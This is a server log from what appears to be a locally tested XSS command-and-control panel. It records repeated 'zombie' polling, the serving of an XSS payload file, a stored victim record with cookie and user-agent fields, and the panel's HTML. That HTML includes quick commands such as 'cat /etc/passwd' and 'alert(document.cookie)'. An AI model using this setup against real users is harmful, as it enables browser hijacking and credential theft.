2025-06-26 21:27:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:27:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:27:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:27:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:27:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:27:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:27:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:27:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:27:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:27:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:27:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:27:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:27:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:27:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:27:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:27:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:27:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:27:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:27:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:27:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:27:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:27:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:27:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:27:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:28:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:28:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:28:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:28:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:28:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:28:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:28:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:28:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:28:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:28:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:28:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:28:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:28:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:28:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:28:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:29:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:29:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:29:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:29:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:29:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:30:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:30:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:30:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:30:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:30:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:31:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:31:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:31:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:31:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:31:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:32:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:32:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:32:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:32:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:32:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:33:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:33:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:33:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:33:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:33:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:34:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:34:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:34:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:34:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:34:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:35:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:35:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:35:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:35:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:35:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:36:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:36:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:36:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:36:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:36:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:37:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:37:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:37:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:37:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:37:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:38:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:38:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:38:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:38:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:38:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:39:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:39:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:39:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:39:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:39:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:40:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:40:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:40:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:40:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:40:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:41:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:41:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:41:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:41:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:41:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:42:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:42:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:42:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:42:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:42:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:43:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:43:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:43:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:43:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:43:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:44:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:44:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:44:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:44:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:44:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:44:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:44:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:44:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:44:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:44:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:44:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:44:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:44:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:44:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:44:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:45:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:45:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:45:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:45:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:45:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:45:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:45:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:45:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:45:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:45:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:45:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:45:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:45:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:45:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:45:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:45:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:45:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:45:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:45:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:45:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:45:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:45:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:45:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:45:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:45:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:45:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:45:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:45:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:45:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:45:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:45:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:45:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:45:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:45:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:45:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:45:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:45:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:45:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:45:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:45:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:45:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:45:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:45:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:45:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:45:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:45:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:45:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:45:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:45:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:45:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:45:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:45:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:45:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:45:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:45:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:46:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:46:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:46:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:46:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:46:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:46:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:46:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:46:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:46:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:46:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:46:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-26 21:46:49 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-26 21:46:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 4313 bytes [200 OK]>
2025-06-26 21:46:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:46:49] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-26 21:46:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 21:46:49 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-26 21:46:49 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-26T13:46:49.131Z"}', None, '2025-06-26 21:46:49.134976', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 21:46:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0028s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-26 21:46:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:46:49] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-26 21:46:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 21:46:49 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 21:46:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0012s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:24:47.378Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:24:47.380560</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 